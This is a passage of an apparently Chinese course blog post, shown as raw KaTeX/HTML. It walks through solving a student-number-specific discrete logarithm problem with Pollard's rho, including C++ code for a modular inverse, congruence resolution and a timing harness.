mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span><span class=\"mord mtight\"><span class=\"mord mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\"><span class=\"mord\"><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">d</span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span>。求逆代码实现如下：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">__uint128_t</span> <span class=\"title\">mod_inverse</span><span class=\"params\">(<span class=\"type\">__uint128_t</span> a, <span class=\"type\">__uint128_t</span> p)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"type\">__uint128_t</span> u = a, v = p, x1 = <span class=\"number\">1</span>, x2 = <span class=\"number\">0</span>, q, r, x;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(u != <span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">        q = v / u;</span><br><span class=\"line\">        r = v - q * u;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(x2 &lt; q * x1) x2 += p;</span><br><span class=\"line\">        x = x2 - q * x1;</span><br><span class=\"line\">        v = u;</span><br><span class=\"line\">        u = r;</span><br><span class=\"line\">        x2 = x1;</span><br><span class=\"line\">        x1 = x;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x1 % p;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>但这个解不一定是 DLP 的解，因为线性同余方程有 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>g</mi><mo>=</mo><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy=\"false\">(</mo><mi>b</mi><mn>1</mn><mo>−</mo><mi>b</mi><mn>2</mn><mo separator=\"true\">,</mo><mi>n</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">g=gcd(b1-b2,n)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">d</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">b</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mclose\">)</span></span></span></span> 个解，只有一个才是我们想要的，那就只好尝试 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>g</mi></mrow><annotation encoding=\"application/x-tex\">g</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span></span></span></span> 次试出最终解了，这 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>g</mi></mrow><annotation encoding=\"application/x-tex\">g</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span></span></span></span> 个解通过 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>x</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup></mrow><annotation encoding=\"application/x-tex\">x&#x27;</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.751892em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span> 构造如下：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub><mo>=</mo><mo stretchy=\"false\">(</mo><msup><mi>x</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo>+</mo><mi>i</mi><mo>⋅</mo><msup><mi>n</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo stretchy=\"false\">)</mo><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><mi>n</mi><mtext> </mtext><mo separator=\"true\">,</mo><mtext>   </mtext><mn>0</mn><mo>≤</mo><mi>i</mi><mo>&lt;</mo><mi>g</mi></mrow><annotation encoding=\"application/x-tex\">x_i=(x&#x27;+i\\cdot n&#x27;)\\bmod n\\ ,\\ \\ \\ 0\\leq i\\lt g\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.051892em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.801892em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.051892em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">n</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.801892em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\"><span class=\"mord\"><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">d</span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8388800000000001em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mspace\"> </span><span class=\"mpunct\">,</span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">0</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">≤</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69862em;vertical-align:-0.0391em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&lt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span></span></span></span></span></p>\n<p>最终求解原方程代码如下：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ((b2 - b1) % g != <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 无解</span></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">__uint128_t</span> n_ = n / g;</span><br><span class=\"line\">    <span class=\"type\">__uint128_t</span> a_ = (a1 - a2) / g;</span><br><span class=\"line\">    <span class=\"type\">__uint128_t</span> b_ = (b2 - b1) / g;</span><br><span class=\"line\">    <span class=\"type\">__uint128_t</span> b_inv = <span class=\"built_in\">mod_inverse</span>(b_, n_);</span><br><span class=\"line\">    <span class=\"type\">__uint128_t</span> x_ = (a_ * b_inv) % n_;</span><br><span class=\"line\">    <span class=\"function\">Int <span class=\"title\">t</span><span class=\"params\">(f)</span></span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">uint64_t</span> i = <span class=\"number\">0</span>; i &lt; g; ++i)&#123;</span><br><span class=\"line\">        <span class=\"type\">uint64_t</span> tmp = <span class=\"built_in\">static_cast</span>&lt;<span class=\"type\">uint64_t</span>&gt;(x_);</span><br><span class=\"line\">        t.a[<span class=\"number\">0</span>] = tmp;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>((alpha ^ t) == beta)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> tmp;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        x_ = (x_ + n_) % n;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0xFFFF&#x27;FFFF&#x27;FFFF&#x27;FFFF</span>;  <span class=\"comment\">// 无解，我返回一个特殊的数</span></span><br></pre></td></tr></table></figure></p>\n<h1 id=\"我学号的-dlp\"><a class=\"anchor\" href=\"#我学号的-dlp\">#</a> 我学号的 DLP</h1>\n<p>相关代码进行计时，输入输出：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span> ONLINE_JUDGE</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;chrono&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iomanip&gt;</span></span></span><br><span class=\"line\">FILE *output, *input;</span><br><span class=\"line\">chrono::time_point&lt;chrono::high_resolution_clock&gt; start_time, end_time;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">  cin.<span class=\"built_in\">tie</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  ios::<span class=\"built_in\">sync_with_stdio</span>(<span class=\"literal\">false</span>);</span><br><span class=\"line\">  cout.<span class=\"built_in\">tie</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">#<span class=\"keyword\">ifndef</span> ONLINE_JUDGE</span></span><br><span class=\"line\">  output = <span class=\"built_in\">freopen</span>(<span class=\"string\">&quot;output&quot;</span>, <span class=\"string\">&quot;w&quot;</span>, stdout);</span><br><span class=\"line\">  input = <span class=\"built_in\">freopen</span>(<span class=\"string\">&quot;input&quot;</span>, <span class=\"string\">&quot;r&quot;</span>, stdin);</span><br><span class=\"line\">  start_time = chrono::high_resolution_clock::<span class=\"built_in\">now</span>();</span><br><span class=\"line\">  <span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">  PollardRho solution;</span><br><span class=\"line\">  string s;</span><br><span class=\"line\">  cin &gt;&gt; solution.f &gt;&gt; solution.n &gt;&gt; solution.alpha &gt;&gt; solution.beta;</span><br><span class=\"line\">  cout &lt;&lt; solution.<span class=\"built_in\">solve</span>();</span><br><span class=\"line\">  cout.<span class=\"built_in\">flush</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">#<span class=\"keyword\">ifndef</span> ONLINE_JUDGE</span></span><br><span class=\"line\">  output = <span class=\"built_in\">freopen</span>(<span class=\"string\">&quot;time&quot;</span>, <span class=\"string\">&quot;w&quot;</span>, stdout);</span><br><span class=\"line\">  end_time = chrono::high_resolution_clock::<span class=\"built_in\">now</span>();</span><br><span class=\"line\">  <span class=\"keyword\">auto</span> ns = chrono::<span class=\"built_in\">duration_cast</span>&lt;chrono::nanoseconds&gt;(end_time - start_time);</span><br><span class=\"line\">  <span class=\"keyword\">auto</span> us = chrono::<span class=\"built_in\">duration_cast</span>&lt;chrono::microseconds&gt;(end_time - start_time);</span><br><span class=\"line\">  <span class=\"keyword\">auto</span> ms = chrono::<span class=\"built_in\">duration_cast</span>&lt;chrono::milliseconds&gt;(end_time - start_time);</span><br><span class=\"line\">  cout &lt;&lt; ns.<span class=\"built_in\">count</span>() &lt;&lt; <span class=\"string\">&quot; ns&quot;</span> &lt;&lt; <span class=\"function\">endl</span></span><br><span class=\"line\"><span class=\"function\">  <span class=\"title\">fclose</span><span class=\"params\">(input)</span></span>;</span><br><span class=\"line\">  <span class=\"built_in\">fclose</span>(output);</span><br><span class=\"line\">  <span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>我的学号 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>22342043</mn></mrow><annotation encoding=\"application/x-tex\">22342043</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord\">2</span><span class=\"mord\">3</span><span class=\"mord\">4</span><span class=\"mord\">2</span><span class=\"mord\">0</span><span class=\"mord\">4</span><span class=\"mord\">3</span></span></span></span> 所确定的 DLP 问题：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mi>p</mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>=</mo><mn>3768901521908407201157691198029711972876087647970824596533</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mo stretchy=\"false\" lspace=\"0em\" rspace=\"0em\">(</mo></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>p</mi><mtext>−</mtext><mn>1</mn><mo>=</mo><mn>2</mn><mo>×</mo><mn>2</mn><mo>×</mo><mn>23</mn><mo>×</mo><mn>8783</mn><mo>×</mo><mn>2419781956425763</mn><mo>×</mo><mn>192888768642311611</mn><mo>×</mo><mn>9993115456385501509</mn><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mi>n</mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>=</mo><mn>9993115456385501509</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mi>α</mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>=</mo><mn>310738241114227181323532264665767292226474841071146486047</mn><msup><mn>6</mn><mrow><mn>2</mn><mo>×</mo><mn>2</mn><mo>×</mo><mn>23</mn><mo>×</mo><mn>8783</mn><mo>×</mo><mn>2419781956425763</mn><mo>×</mo><mn>192888768642311611</mn><mo>×</mo><mn>22342043</mn></mrow></msup></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>=</mo><mn>1672705575588793411750559287020484713881877693514202546508</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mi>β</mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>=</mo><mn>2120553873612439845419858696451540936395844505496867133711</mn></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\np&amp;=3768901521908407201157691198029711972876087647970824596533\\\\\n(&amp;p−1=2×2×23×8783×2419781956425763×192888768642311611×9993115456385501509)\\\\\nn&amp;=9993115456385501509\\\\\n\\alpha&amp;=3107382411142271813235322646657672922264748410711464860476^{2×2×23×8783×2419781956425763×192888768642311611×22342043}\\\\\n&amp;=1672705575588793411750559287020484713881877693514202546508\\\\\n\\beta&amp;=2120553873612439845419858696451540936395844505496867133711\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:9.024108000000002em;vertical-align:-4.262054000000002em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:4.762054000000001em;\"><span style=\"top:-6.922054000000001em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">p</span></span></span><span style=\"top:-5.422054em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mopen\">(</span></span></span><span style=\"top:-3.9220539999999993em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">n</span></span></span><span style=\"top:-2.3979459999999992em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.0037em;\">α</span></span></span><span style=\"top:-0.8979459999999992em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"></span></span><span style=\"top:0.6020540000000016em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.05278em;\">β</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:4.262054000000002em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:4.762054000000001em;\"><span style=\"top:-6.922054000000001em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\">3</span><span class=\"mord\">7</span><span class=\"mord\">6</span><span class=\"mord\">8</span><span class=\"mord\">9</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mord\">5</span><span class=\"mord\">2</span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">0</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">0</span><span class=\"mord\">7</span><span class=\"mord\">2</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mord\">1</span><span class=\"mord\">5</span><span class=\"mord\">7</span><span class=\"mord\">6</span><span class=\"mord\">9</span><span class=\"mord\">1</span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">8</span><span class=\"mord\">0</span><span class=\"mord\">2</span><span class=\"mord\">9</span><span class=\"mord\">7</span><span class=\"mord\">1</span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">7</span><span class=\"mord\">2</span><span class=\"mord\">8</span><span class=\"mord\">7</span><span class=\"mord\">6</span><span class=\"mord\">0</span><span class=\"mord\">8</span><span class=\"mord\">7</span><span class=\"mord\">6</span><span class=\"mord\">4</span><span class=\"mord\">7</span><span class=\"mord\">9</span><span class=\"mord\">7</span><span class=\"mord\">0</span><span class=\"mord\">8</span><span class=\"mord\">2</span><span class=\"mord\">4</span><span class=\"mord\">5</span><span class=\"mord\">9</span><span class=\"mord\">6</span><span class=\"mord\">5</span><span class=\"mord\">3</span><span class=\"mord\">3</span></span></span><span style=\"top:-5.422054em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathnormal\">p</span><span class=\"mord\">−</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">2</span><span class=\"mord\">3</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">8</span><span class=\"mord\">7</span><span class=\"mord\">8</span><span class=\"mord\">3</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">2</span><span class=\"mord\">4</span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">7</span><span class=\"mord\">8</span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">5</span><span class=\"mord\">6</span><span class=\"mord\">4</span><span class=\"mord\">2</span><span class=\"mord\">5</span><span class=\"mord\">7</span><span class=\"mord\">6</span><span class=\"mord\">3</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">2</span><span class=\"mord\">8</span><span class=\"mord\">8</span><span class=\"mord\">8</span><span class=\"mord\">7</span><span class=\"mord\">6</span><span class=\"mord\">8</span><span class=\"mord\">6</span><span class=\"mord\">4</span><span class=\"mord\">2</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">1</span><span class=\"mord\">6</span><span class=\"mord\">1</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">9</span><span class=\"mord\">9</span><span class=\"mord\">9</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">1</span><span class=\"mord\">5</span><span class=\"mord\">4</span><span class=\"mord\">5</span><span class=\"mord\">6</span><span class=\"mord\">3</span><span class=\"mord\">8</span><span class=\"mord\">5</span><span class=\"mord\">5</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mord\">5</span><span class=\"mord\">0</span><span class=\"mord\">9</span><span class=\"mclose\">)</span></span></span><span style=\"top:-3.9220539999999993em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\">9</span><span class=\"mord\">9</span><span class=\"mord\">9</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">1</span><span class=\"mord\">5</span><span class=\"mord\">4</span><span class=\"mord\">5</span><span class=\"mord\">6</span><span class=\"mord\">3</span><span class=\"mord\">8</span><span class=\"mord\">5</span><span class=\"mord\">5</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mord\">5</span><span class=\"mord\">0</span><span class=\"mord\">9</span></span></span><span style=\"top:-2.3979459999999992em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord\">7</span><span class=\"mord\">3</span><span class=\"mord\">8</span><span class=\"mord\">2</span><span class=\"mord\">4</span><span class=\"mord\">1</span><span class=\"mord\">1</span><span class=\"mord\">1</span><span class=\"mord\">4</span><span class=\"mord\">2</span><span class=\"mord\">2</span><span 